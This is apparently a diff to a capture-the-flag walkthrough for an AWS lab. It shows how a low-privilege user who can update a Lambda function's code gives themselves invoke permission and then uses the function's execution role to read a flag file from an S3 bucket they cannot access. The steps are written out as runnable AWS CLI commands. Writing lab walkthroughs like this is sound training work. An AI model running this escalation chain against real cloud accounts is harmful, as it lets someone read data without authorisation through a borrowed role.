@@ -89,11 +89,14 @@ The function now contains your malicious code. But you still cannot invoke it be
 ### Step 3: Grant yourself invocation rights
 
 ```bash
+ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+USER_ARN="arn:aws:iam::${ACCOUNT_ID}:user/pl-prod-lambda-005-to-bucket-starting-user"
+
 aws lambda add-permission \
   --function-name pl-prod-lambda-005-to-bucket-target-lambda \
   --statement-id allow-self-invoke \
   --action lambda:InvokeFunction \
-  --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user
+  --principal "$USER_ARN"
 ```
 
 This appends a statement to the function's resource-based policy that explicitly allows your user to invoke it. Lambda evaluates both the identity-based policy (which already permits `lambda:InvokeFunction` on this function) and the resource-based policy -- both must allow the call. The `add-permission` call satisfies the resource-policy side of that check.
@@ -108,12 +111,14 @@ aws lambda get-policy \
 
 ### Step 4: Invoke the function
 
-Wait a few seconds for the code update to propagate, then invoke the function with the target bucket name in the payload:
+Wait a few seconds for the code update to propagate. Your starting user has no S3 permissions, so the bucket name comes from the platform, not the API -- take `TARGET_BUCKET` from the **Outputs** tab (`target_bucket_name`) next to your terminal, then invoke the function with it in the payload:
 
 ```bash
+TARGET_BUCKET=<paste the target_bucket_name output here>
+
 aws lambda invoke \
   --function-name pl-prod-lambda-005-to-bucket-target-lambda \
-  --payload "{\"bucket\": \"pl-prod-lambda-005-to-bucket-{account_id}-{suffix}\"}" \
+  --payload "{\"bucket\": \"${TARGET_BUCKET}\"}" \
   /tmp/lambda-response.json
 
 cat /tmp/lambda-response.json
@@ -127,7 +132,7 @@ The function executed under `pl-prod-lambda-005-to-bucket-lambda-exec-role`, whi
 The flag appears directly in the Lambda invocation response. To confirm the execution role was what actually read the data — not your starting user — you can check that a direct S3 call still fails from the starting user's credentials:
 
 ```bash
-aws s3 cp s3://pl-prod-lambda-005-to-bucket-{account_id}-{suffix}/flag.txt -
+aws s3 cp s3://${TARGET_BUCKET}/flag.txt -
 # An error occurred (AccessDenied) -- your starting user still has no direct S3 access
 ```
 
@@ -138,7 +143,7 @@ This confirms the exfiltration happened indirectly through the Lambda execution 
 The flag is stored as `flag.txt` inside the target S3 bucket. You have already read it via the Lambda invocation response, but the canonical retrieval command using the access you gained through the execution role is:
 
 ```bash
-aws s3 cp s3://pl-prod-lambda-005-to-bucket-{account_id}-{suffix}/flag.txt -
+aws s3 cp s3://${TARGET_BUCKET}/flag.txt -
 ```
 
 The `aws s3 cp ... -` syntax streams the object to stdout. To run this directly you would need credentials for `pl-prod-lambda-005-to-bucket-lambda-exec-role`, which your starting user cannot assume. In practice, the Lambda invocation is the equivalent step: the function body is your code, the execution role is your identity, and the flag arrives in the invocation response. The value printed in the `body` field of the Lambda response is the flag you submit to complete the challenge.
